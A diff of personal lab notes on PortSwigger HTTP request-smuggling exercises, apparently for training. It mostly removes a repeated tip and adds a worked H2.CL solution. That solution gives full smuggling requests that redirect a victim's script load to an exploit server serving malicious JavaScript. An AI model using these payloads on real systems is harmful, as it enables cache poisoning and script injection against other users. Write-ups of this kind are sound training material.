@@ -43,10 +43,6 @@ Prompt:
 > Note
 > 
 > Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
-> Tip
-> 
-> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
-> 
 
 
 asdf
@@ -61,9 +57,6 @@ Prompt:
 > Note
 > 
 > Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
-> Tip
-> 
-> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
 
 
 struggled a lot with getting the right length on this one - easiest way is to set up a scratch pad for the current req + the next one and highlight to get lengths calculated by burp
@@ -100,9 +93,6 @@ Prompt:
 > Note
 > 
 > Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
-> Tip
-> 
-> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
 
 
 asdf
@@ -118,9 +108,7 @@ Prompt:
 Note
 > 
 > Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
-> Tip
-> 
-> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
+
 
 
 asdf
@@ -136,9 +124,7 @@ Prompt:
 > Note
 > 
 > Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
-> Tip
-> 
-> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
+
 
 
 asdf
@@ -155,10 +141,7 @@ Prompt:
 > 
 >     Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
 >     The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
-> 
-> Tip
-> 
-> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
+
 
 
 asdf
@@ -196,9 +179,7 @@ Prompt:
 >     Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
 >     The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
 > 
-> Tip
-> 
-> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
+
 
 
 asdf
@@ -228,6 +209,109 @@ asdf
 
 ## 0x09: H2.CL request smuggling
 
+Prompt:
+> This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.
+> 
+> To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds. 
+
+step 1 - finding the HRS
+
+start simple with PoC - do a redir to 404
+
+req
+```
+POST / HTTP/2
+Host: 0aed007a045d220a80f3031000d6004f.web-security-academy.net
+Cookie: session=NzeWMJAQjR2FFIESxvr6HXXihEO3rcLj
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /404 HTTP/1.1
+Host: 0aed007a045d220a80f3031000d6004f.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+
+
+```
+
+response:
+```HTTP
+HTTP/2 404 Not Found
+Content-Type: application/json; charset=utf-8
+Set-Cookie: session=3fxl4X2UoFmDOMmG5zNoJkrL076YZHeq; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 11
+
+"Not Found"
+```
+
+confirming with a more complicated payload - searching
+
+
+
+step 2 - make it load something else
+
+this step took me quite a bit - had to find some way to get it to load our javascript from the exploit server
+
+req:
+```
+GET /resources/js HTTP/2
+Host: 0aed007a045d220a80f3031000d6004f.web-security-academy.net
+```
+
+response:
+```HTTP
+HTTP/2 302 Found
+Location: https://0aed007a045d220a80f3031000d6004f.web-security-academy.net/resources/js/
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+
+now we need to see if we can get it load something with our exploit server in the URL
+
+need to combine the redirect with our HRS to get it to return our server, thus poisoning the cache
+
+attack request:
+```
+POST / HTTP/2
+Host: 0aed007a045d220a80f3031000d6004f.web-security-academy.net
+Cookie: session=NzeWMJAQjR2FFIESxvr6HXXihEO3rcLj
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /resources/js HTTP/1.1
+Host: exploit-0a5400a9040822e0808502cb012000fc.exploit-server.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 110
+
+search=
+```
+
+and now if we request the JS file immediately after:
+```
+GET /resources/js/analytics.js?uid=1 HTTP/2
+Host: 0aed007a045d220a80f3031000d6004f.web-security-academy.net
+```
+
+reseponse:
+
+```HTTP
+HTTP/2 302 Found
+Location: https://exploit-0a5400a9040822e0808502cb012000fc.exploit-server.net/resources/js/
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+
+now we just have to set up the exploit server to serve malicious JS
+
+server_settings.jpg
+
+honestly, timing was the hardest part of this - so fiddly. easiest way to finally pop alert was to refresh page, let it load, then send the attack payload after analyticsFetcher.js loaded
+
+once you have it popping on yourself, it really is just spray and pray - throw one out every few seconds, hoping that the victim picks it up at the right timing. eventually you'll get the solved banner!
+
 asdf
 
 ## 0x0A: HTTP/2 request smuggling via CRLF injection
@@ -255,10 +339,7 @@ Prompt:
 > To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.  
 > Note  
 > 
-> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.  
-> Tip  
->   
-> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.  
+> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
 
 Very straightforward
 
@@ -290,8 +371,6 @@ Prompt:
 > To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
 > Note
 > Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
-> Tip
-> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
 
 Not as straightforward - need to add in a 2nd request to this one
 
@@ -324,9 +403,7 @@ Prompt:
 > Note
 > 
 > Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
-> Tip
-> 
-> Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
+
 
 
 asdf
@@ -356,10 +433,7 @@ Prompt:
 >
 >    Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
 >    The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
->
->Tip
->
->Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
+
 
 Full disclosure on this one - it took me a fair bit of trial and error, and a hint from the solution to let me know I wasn't looking for HRS in the right place :) 
 
